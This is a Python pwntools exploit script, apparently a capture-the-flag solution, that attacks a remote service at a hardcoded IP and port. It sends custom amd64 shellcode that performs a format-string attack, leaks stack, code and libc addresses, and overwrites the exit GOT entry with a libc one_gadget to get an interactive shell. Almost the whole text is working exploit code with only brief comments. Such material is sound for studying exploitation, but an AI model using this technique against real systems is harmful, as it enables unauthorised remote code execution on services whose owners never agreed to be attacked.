from pwn import *

context.arch = 'amd64'

###Addr
#  libc2.29
exit_got_offset = 0x4088
csu_init_offset = 0x1a40
libc_start_offset = 0x26a80
one_gadget = 0x106ef8

###Exploit
r = remote('140.112.31.97',30202)

###Shellcode to perform format string attack and change fd recorded on stack to STDIN/STDOUT FILENO
shellcode = asm('''
                // rbx = memory addres
                // r12~r15 = reserved registers for main
                // code = memory[0:0xc00]
                // stack = memory[0xc00:0xe00]
                // data = memory[0xe00:0x1000]

                mov rbx, rdx
                lea rsp, [rbx+0xc00]
                mov rbp, rsp
                jmp MAIN

                FUNCS:
                    READ:
                        mov rax, 0
                        syscall
                        ret

                    WRITE:
                        mov rax, 1
                        syscall
                        ret

                    HEXTONUM:
                        mov rcx, 0
                        mov rax, 0
                        HEXTONUMLOOP:
                            sal rax, 0x4
                            mov r8, 0
                            mov r8b, byte ptr [rdi+rcx]
                            cmp r8, 0x3a
                            jge HEXTONUMALPHA
                            sub r8, 0x30
                            jmp HEXTONUMCONVERTED
                          HEXTONUMALPHA:
                            sub r8, 0x57
                          HEXTONUMCONVERTED:
                            add rax, r8
                            inc rcx
                            cmp rcx, 12
                            jl HEXTONUMLOOP
                        ret

                    NUMTODEC:
                        mov r8, 0
                        mov rax, rdi
                        mov rcx, 11
                        dec rcx
                        NUMTODECLOOP:
                            mov rdx, 0
                            div rcx
                            add rdx, 0x30
                            mov byte ptr [rsi+r8], dl
                            inc r8
                            test rax, rax
                            jne NUMTODECLOOP
                        mov rax, r8
                        ret

                    MEMCPY:
                        mov r8, 0
                        cmp rcx, 0
                        jl MEMCPYINV
                        mov r9, 0
                        jmp MEMCPYLOOP
                      MEMCPYINV:
                        lea r9, [rdx-1] 
                        MEMCPYLOOP:
                            cmp r8, rdx
                            je MEMCPYRET
                            mov r10b, byte ptr [rsi+r9]
                            mov byte ptr [rdi+r8], r10b
                            inc r8
                            add r9, rcx
                            jmp MEMCPYLOOP
                        MEMCPYRET:
                            ret

                MAIN:
                    // leak stack addr
                        mov rdi, 6
                        lea rsi, [rbx+0xe00]
                        mov rdx, 0x14
                        call WRITE

                        mov rdi, 3
                        lea rsi, [rbx+0xefd]
                        mov rdx, 0xf
                        call READ

                        lea rdi, [rbx+0xf00]
                        call HEXTONUM
                        mov qword ptr [rbx+0xf80], rax

                        mov rdi, 6
                        lea rsi, [rbx+0xe10]
                        mov rdx, 0x14
                        call WRITE

                        mov rdi, 3
                        lea rsi, [rbx+0xeff]
                        mov rdx, 8
                        call READ

                        and byte ptr [rbx+0xf00], 0xf0

                        lea rdi, [rbx+0xf88]
                        lea rsi, [rbx+0xf00]
                        mov rdx, 6
                        mov rcx, 1
                        call MEMCPY

                        mov rax, qword ptr [rbx+0xf88]
                        mov rcx, qword ptr [rbx+0xf80]
                        sub rax, rcx
                        mov rdx, 0
                        mov rcx, 8
                        div rcx
                        add rax, 62
                        mov qword ptr [rbx+0xf98], rax

                        mov rdi, qword ptr [rbx+0xf98]
                        lea rsi, [rbx+0xfc0]
                        call NUMTODEC

                        lea rcx, [rax+0xfc0]
                        mov word ptr [rbx+rcx], 0x6325
                        add rax, 2

                        lea rcx, [rax+4]
                        mov rdx, rax
                        mov qword ptr [rbx+0xfa8], rcx
                        neg rax
                        add rax, 0xe50
                        lea rdi, [rbx+rax]
                        mov qword ptr [rbx+0xfa0], rdi
                        lea rsi, [rbx+0xfc0]
                        mov rcx, -1
                        call MEMCPY

                        mov rax, qword ptr [rbx+0xf80]
                        sub rax, 0x184
                        mov qword ptr [rbx+0xf90], rax

                    //fmt to craft pointer to fds
                        mov r12, 0
                        MAINOVERWRITEFDLOOP:
                            mov r13, 0
                            MAINPREPAREPTRLOOP:
                                mov qword ptr [rbx+0xfb0], 0
                                MAINPREPAREPTRUTILLOOP:
                                    mov rcx, qword ptr [rbx+0xfb0]
                                    test rcx, rcx
                                    jne MAINPREPAREPTRDEREFERENCE
                                    mov rdi, 0
                                    mov dil, byte ptr [rbx+0xf88]
                                    add dil, r13b
                                    jmp MAINCONVERTFMTVAL
                                  MAINPREPAREPTRDEREFERENCE:
                                    mov rdi, 0
                                    lea r14, [r13+0xf90]
                                    mov dil, byte ptr [rbx+r14]
                                  MAINCONVERTFMTVAL:
                                    dec dil
                                    lea rsi, [rbx+0xfc0]
                                    call NUMTODEC

                                    lea r14, [rax+0xfc0]
                                    mov word ptr [rbx+r14], 0x4d25
                                    add rax, 2

                                    lea r15, [rax+9]
                                    mov r11, rax
                                    neg rax
                                    add rax, 0xe20
                                    mov r14, rax
                                    mov rax, qword ptr [rbx+0xfb0]
                                    mov rdx, 0
                                    mov rcx, 0x10
                                    mul rcx
                                    add rax, r14
                                    mov r14, rax
                                    lea rdi, [rbx+rax]
                                    lea rsi, [rbx+0xfc0]
                                    mov rdx, r11
                                    mov rcx, -1
                                    call MEMCPY

                                    mov rdi, 6
                                    lea rsi, [rbx+r14]
                                    mov rdx, r15
                                    call WRITE

                                    test r12, r12
                                    jne MAINSKIPREAD1

                                    mov rdi, 3
                                    lea rsi, [rbx+0xf00]
                                    mov rdx, 0x1
                                    call READ

                                  MAINSKIPREAD1:
                                    mov rax, qword ptr [rbx+0xfb0]
                                    inc rax
                                    mov qword ptr [rbx+0xfb0], rax
                                    cmp rax, 2
                                    jl MAINPREPAREPTRUTILLOOP
                                inc r13
                                cmp r13, 8
                                jl MAINPREPAREPTRLOOP

                            mov rdi, r12
                            neg rdi
                            inc rdi
                            sub dil, 3
                            lea rsi, [rbx+0xfc0]
                            call NUMTODEC

                            lea r14, [rax+0xfc0]
                            mov dword ptr [rbx+r14], 0x4d5f5f25
                            add rax, 4

                            mov r14, qword ptr [rbx+0xfa8]
                            inc r14
                            lea r15, [rax+r14]
                            mov rdx, rax
                            neg rax
                            add rax, qword ptr [rbx+0xfa0]
                            mov r14, rax
                            mov rdi, rax
                            lea rsi, [rbx+0xfc0]
                            mov rcx, -1
                            call MEMCPY

                            mov rdi, 6
                            mov rsi, r14
                            mov rdx, r15
                            call WRITE

                            test r12, r12
                            jne MAINSKIPREAD2

                            mov rdi, 3
                            lea rsi, [rbx+0xf00]
                            mov rdx, 0x1
                            call READ

                          MAINSKIPREAD2:

                            mov rax, qword ptr [rbx+0xf90]
                            add rax, 4
                            mov qword ptr [rbx+0xf90], rax

                            inc r12
                            cmp r12, 2
                            jl MAINOVERWRITEFDLOOP

                    //guard against crash/exit
                        mov rdi, 3
                        lea rsi, [rbx+0xe00]
                        mov rdx, 0x100
                        call READ
                ''')
argument = b'M%36$p'.ljust(0x10,b'\x00')+\
           b'M%36$s'.ljust(0x10,b'\x00')+\
           b'c%36$hhn'.ljust(0x10,b'\x00')+\
           b'c%62$hhn'.ljust(0x20,b'\x00')+\
           b'$hhn'.ljust(0x10,b'\x00')
payload = shellcode.ljust(0xe00,b'\x00')+argument
r.sendlineafter('code : ',payload)

###Cleanup Garbage Output
r.send('M30W\x00')
r.recvuntil('M30W')

###Leak stuff again
r.send('M%36$pM30W\x00')
first_ptr = int(r.recvuntil('M30W',drop=True)[3:],16)
print(hex(first_ptr))

r.send('M%36$sM30W\x00')
second_ptr = u64(r.recvuntil('M30W',drop=True)[1:]+b'\x00\x00')&0xfffffffffffffff0
print(hex(second_ptr))

second_ptr_idx = (second_ptr-first_ptr)//8+62

r.send('M%33$pM30W\x00')
csu_init_addr = int(r.recvuntil('M30W',drop=True)[3:],16)
code_base = csu_init_addr-csu_init_offset
print(hex(code_base))

r.send('M%34$pM30W\x00')
libc_start_addr = int(r.recvuntil('M30W',drop=True)[3:],16)-235
libc_base = libc_start_addr-libc_start_offset
print(hex(libc_base))

###Overwrite exit_got with one_gadget
target_addr = code_base+exit_got_offset
for i in range(6):
    for j in range(6):
        r.send(f'M%{(second_ptr+j+0xff)&0xff}c%36$hhnM30W\x00')
        r.recvuntil('M30W')
        r.send(f'M%{((target_addr>>(j*8))+0xff)&0xff}c%62$hhnM30W\x00')
        r.recvuntil('M30W')
    r.send(f'M%{(((libc_base+one_gadget)>>(i*8))+0xff)&0xff}c%{second_ptr_idx}$hhnM30W\x00')
    r.recvuntil('M30W')
    target_addr+=1

###Trigger exit
r.send('G')

r.interactive()
